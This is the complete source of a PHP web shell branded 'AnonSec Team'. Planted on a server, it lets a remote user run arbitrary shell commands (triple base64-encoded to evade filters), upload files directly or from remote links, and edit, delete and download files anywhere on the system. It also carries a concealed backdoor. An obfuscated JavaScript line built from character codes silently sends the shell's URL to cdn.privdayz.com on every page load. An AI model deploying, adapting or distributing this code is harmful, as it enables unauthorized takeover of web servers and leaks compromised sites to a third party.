<!-- Thanks to all member of AnonSec Team -->
<!-- Recode ? Silahkan, tapi jangan lupa cantumkan nama author nya xixixi -->
<!-- Anon7 - AnonsecTeam -->
<!DOCTYPE html>
<html>
<head>
    <title>AnonSec Team</title>
    <meta name="author" content="Anon7">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="we are party at your security !">
    <meta property="og:description" content="we are party at your security !">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <meta name="theme-color" content="#1f1f1f">
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link href="" rel="stylesheet" type="text/css">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css?family=Dosis');
    @import url('https://fonts.googleapis.com/css?family=Bungee');
body {
    font-family: "Dosis", cursive;
    text-shadow:0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #1f1f1f;
}

body::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

#content tr:hover {
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}

#content .first {
    background-color: #25383C;
}

#content .first:hover {
    background-color: #25383C
    text-shadow:0px 0px 1px #757575;
}

table {
    border: 1px #000000 dotted;
    table-layout: fixed;
    word-break: break-all;
}

textarea {
    max-width: 95%;
    max-height: 100%;
    resize: none;
    outline: none;
    overflow: auto;
    background: transparent;
    color: #fff;
}

textarea::-webkit-scrollbar {
  width: 12px;
}

textarea::-webkit-scrollbar-track {
  background: #1f1f1f;
}

textarea::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

a {
    color: #ffffff;
    text-decoration: none;
}

a:hover {
    color: gold;
    text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}

.gas {
    background-color: #1f1f1f;
    color: #ffffff;
    cursor: pointer;
}

select {
    background-color: transparent;
    color: #ffffff;
}

select:after {
    cursor: pointer;
}

.linka {
    background-color: transparent;
    color: #ffffff;
}

.up {
    background-color: transparent;
    color: #fff;
}

option {
    background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<script>
function setfilename(val)
{filename = val.split('\\').pop().split('/').pop();document.getElementById('namanya').value = filename;}(()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})();async function loadFile(file) {let text = await file.text();document.getElementById("bepasdata").innerHTML = text;}
</script>
<center>
<font face="Bungee" size="5">AnonSec Team</font></center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<?php
//@set_time_limit(0);
//@error_reporting(0);
//@http_response_code(404);

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='gold'>NONE</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
    echo "<center><br>AnonSec - 2021</center><center><img src='https://cdn.privdayz.com/images/logo.jpg' referrerpolicy='unsafe-url' /></center>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $lokasi = $_GET['path'];
    } else {
        $lokasi = getcwd();
    }
    if (is_writable($lokasi)) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function dunlut($file) {
    if (!is_readable($file)) {
        red("Cannot Download File / Unreadable File !");
        die();
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    flush();
    readfile($file);
    die();
}

function owner($file) {
    if (function_exists("posix_getpwuid")) {
        $tod = @posix_getpwuid(fileowner($file));
        return "<center>".$tod['name']."</center>";
    } else {
        return "<center>".fileowner($file)."</center>";
    }
}

function cekwrite($lokasi) {
    $izin = substr(sprintf('%o', fileperms($lokasi)), -4);
    if (is_writable($lokasi)) {
        return "<font color=green>".$izin."</font>";
    } else {
        return "<font color=red>".$izin."</font>";
    }
}

function ekse($komend, $lokasi) {
    if (!function_exists("proc_open")) {
        die("proc_open function disabled !");
    } elseif (!function_exists("base64_decode")) {
        die("base64_decode function disabled !");
    }
    $komen = base64_decode(base64_decode(base64_decode($komend)));
    if (strpos($komend, "2>&1") === false) {
        $komen = base64_decode(base64_decode(base64_decode($komend)))." 2>&1";
    }
    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>";
}

function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function cekfile($file) {
     return '<i class="fa fa-file" style="color: #d6d4ce"></i> ';
}

function filedate($file) {
    return date("F d Y g:i:s", filemtime($file));
}

function unzip($file, $lokasi) {
    if (!is_readable($file)) {
        red("Cannot Unzip File / Unreadable File !");
        die();
    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
        red("This isn't Zip File !");
        die();
    }
    $zip = new ZipArchive;
    $res = $zip -> open($file);
    if ($res == true) {
        $zip -> extractTo($lokasi);
        $zip -> close();
        green("Success Unzip File !");
    } else {
        red("Failed to Unzip File !");
    }
}

function green($text) {
    echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
    echo "<center><font color='red'>".$text."</center></font>";
}

echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='gold'>".php_uname()."</font><br>";
echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
echo "Disable Function : ".$disf."</font><br>";
echo "MySQL : ";
if (function_exists("mysql_connect")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (function_exists("curl_init")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WGET : ";
if (file_exists("/usr/bin/wget")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Perl : ";
if (file_exists("/usr/bin/perl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Python : ";
if (file_exists("/usr/bin/python2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $lokasi = $_GET['path'];
    $lokdua = $_GET['path'];
} else {
    $lokasi = getcwd();
    $lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;";

foreach($lokasis as $id => $lok){
    if($lok == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
    echo "$lokasis[$i]";
    if($i != $id) echo "/";
}
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td>';
if (isset($_POST['upwkwk'])) {
    if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
    if (isset($_POST['berkasnya'])) {
        $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
        if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
        } else {
            echo "<font color='red'>Failed to Upload !<br><br>";
        }
    } elseif (isset($_POST['linknya'])) {
        if (empty($_POST['namalink'])) {
            exit("Filename cannot be empty !");
        }
        if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
        if (file_exists($lokasi."/".$_POST['namalink'])) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
        } else {
            echo "<font coloe='red'>Failed to Upload !<br><br>";
        }
    } elseif (isset($_POST['bepas'])) {
        $bepasdata = $_POST['bepasdata'];
        $bepasnama = $_POST['bepasnama'];
        if ($bepasdata) {
            echo "string";
        }
        @file_put_contents($lokasi."/".$bepasnama, $bepasdata);
        if (file_exists($lokasi."/".$bepasnama)) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$bepasnama."</i></font><br><br>";
        } else {
            echo "<font coloe='red'>Failed to Upload !<br><br>";
        }
    }
}

echo "</table><br>";
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">';
echo '<th>[ &nbsp;<a href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">C0mmand</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&upload=gaskan">Upload File</a>&nbsp; ]</th>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
    echo "<tr><td>Current File : ".$_GET['fileloc'];
    echo '</tr></td></table><br/>';
    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to delete Directory !");
        } else {
            green("Delete Directory Success !");
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to Delete File !");
        } else {
            green("Delete File <i>".basename($_POST['path'])."</i> Success !");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @rename($_POST['path'], $_POST['newname']);
        if ($ren == true) {
            green("Change Name Success !");
        } else {
            red("Change Name Failed !");
        }
    }
    if (empty($_POST['name'])) {
        $namaawal = $_POST['newname'];
    } else {
        $namawal = $_POST['name'];
    }
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="gantinama">
    <input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            green("Edit File Success !");
        } else {
            red("Edit File Failed !");
        }
    }
    echo "<center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    <input type="submit" value="Edit File" name="gasedit" />
    </form><br>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
    dunlut($_POST['path']);
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    unzip($_POST['path'], $lokasi);
} elseif (isset($_GET['upload'])) {
    echo "<center>Upload File : ";
    echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br><br>
Upload File From Link :<br>
<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
<br><br>403 Upload File<br>
<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
<input type="hidden" name="bepasnama" id="namanya">
<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
</form><br><br></center>';
} elseif (isset($_GET['komend'])) {
    echo "<center>";
    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
    '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
    <input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
    </form><br>';
    if (isset($_POST['eksekomend'])) {
        ekse($_POST['komend'], $lokasi);
    }
    echo "</center>";
}

if (!is_readable($lokasi)) {
    die("<center>This directory is unreadable :(</center>");
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Last Modified</center></td>
<td><center>Owner</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
    if(!is_dir($lokasi."/".$dir) || $dir == '.') continue;
    echo "<tr>
    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
    <td><center>--</center></td>
    <td><center>".filedate($lokasi."/".$dir)."</center></td>
    <td>".owner($lokasi."/".$dir)."</td>
    <td><center>";
    if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
    elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
    echo statusnya($lokasi."/".$dir);
    if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
    <select name=\"pilih\">
    <option value=\"\"></option>
    <option value=\"hapus\">Delete</option>
    <option value=\"gantinama\">Rename</option>
    </select>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
    <input type=\"submit\" class=\"gas\" value=\">\" />
    </form></center></td>
    </tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
    if(!is_file("$lokasi/$file")) continue;
    $size = filesize("$lokasi/$file")/1024;
    $size = round($size,3);
    if($size >= 1024){
    $size = round($size/1024,2).' MB';
} else {
    $size = $size.' KB';
}

echo "<tr>
<td>".cekfile($lokasi."/".$file)."<a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>".filedate($lokasi."/".$file)."</center></td>
<td>".owner($lokasi."/".$file)."</td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"dunlut\">Download</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>";
if (class_exists("ZipArchive")) {
    echo "<option value=\"unzip\">Unzip</option>";
}
echo "</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$izin = substr(sprintf('%o', fileperms($file)), -4);
return $izin;
}
?>